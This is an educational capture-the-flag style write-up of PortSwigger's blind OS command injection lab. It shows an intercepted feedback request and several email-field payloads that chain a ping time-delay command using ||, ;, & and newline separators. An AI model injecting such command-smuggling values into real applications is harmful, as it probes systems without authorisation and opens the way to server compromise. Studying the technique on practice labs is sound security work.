# Blind OS Command Injection with Time Delays

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Exploit the blind OS command injection vulnerability to cause a **10 second delay**.

---

## Lab

https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

**Blind OS Command Injection** means the application executes our injected command but **never shows the output** in the HTTP response. The command runs silently on the server.

In the simple lab, we could see `whoami` output directly in the response. Here we cannot. The feedback form calls something like:

```bash
mail -s "Subject" -aFrom:user@email.com feedback@site.com
```

Our input goes into this command but the mail output is never returned to us.

### How Time Delay Detection Works

Since we cannot see output, we use **time** as our signal:

```
Normal request  → response in ~500ms
Injected sleep  → response in ~10 seconds
```

If the response takes 10 seconds → our command executed 

The best command for this is `ping` — it lets us control exactly how long it runs:

```bash
# Linux — ping loopback 10 times = ~10 seconds
ping -c 10 127.0.0.1

# Windows — ping loopback 10 times = ~10 seconds  
ping -n 10 127.0.0.1
```

---

## Steps to Solve

---

**Step 1 — Find the Injection Point**

Navigate to the **Submit Feedback** page. Fill in the form and submit — intercept the request in ZAP:

```http
POST /feedback/submit HTTP/1.1
Host: lab-id.web-security-academy.net

csrf=token&name=a&email=test@test.com&subject=a&message=a
```

The `email` field is the most likely injection point — it gets passed to the `mail` command directly.

<img width="1029" height="320" alt="image" src="https://github.com/user-attachments/assets/9ce22a4a-4eea-4c06-a94b-6ad64c24f2a6" />

---

**Step 2 — Confirm Blind Injection with Time Delay**

Modify the `email` field to inject a ping command:

```
email=test@test.com||ping+-c+10+127.0.0.1||
```

URL decoded:
```
test@test.com||ping -c 10 127.0.0.1||
```

The `||` separators chain the ping command onto the mail command.

Send the request and measure response time.

<img width="983" height="370" alt="image" src="https://github.com/user-attachments/assets/8aca6281-7bd5-4b77-8bb6-7c5a42dc2aa6" />

<img width="1903" height="105" alt="image" src="https://github.com/user-attachments/assets/9f9eeb36-414a-4b80-aa5f-bb938a4383e9" />

If response takes ~10 seconds → blind injection confirmed 

---

**Step 3 — Try Other Separators if Needed**

If `||` does not work, try:

```
email=test@test.com%3Bping+-c+10+127.0.0.1%3B
```
(`;` separator — Unix only)

```
email=test@test.com%26ping+-c+10+127.0.0.1%26
```
(`&` separator)

```
email=test@test.com%0aping+-c+10+127.0.0.1
```
(newline separator `%0a`)

---

**Lab Solved**

<img width="1617" height="674" alt="image" src="https://github.com/user-attachments/assets/42623c29-4e31-43ed-bfdc-3cf1cd1bf438" />

---

## Time Delay Commands Reference

| OS | Command | Time |
|----|---------|------|
| Linux | `ping -c 10 127.0.0.1` | ~10 sec |
| Windows | `ping -n 10 127.0.0.1` | ~10 sec |
| Linux | `sleep 10` | exactly 10 sec |
| Both | `ping -c 1 -W 10 127.0.0.1` | ~10 sec |

---

## How This Differs from Simple Case

| | Simple Case | Blind Time Delay |
|--|--|--|
| Output visible | Yes | No |
| Confirm injection by | Seeing output | Response time |
| Data extraction | Read from response | Cannot (yet) |
| Command used | `whoami` | `ping -c 10 127.0.0.1` |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
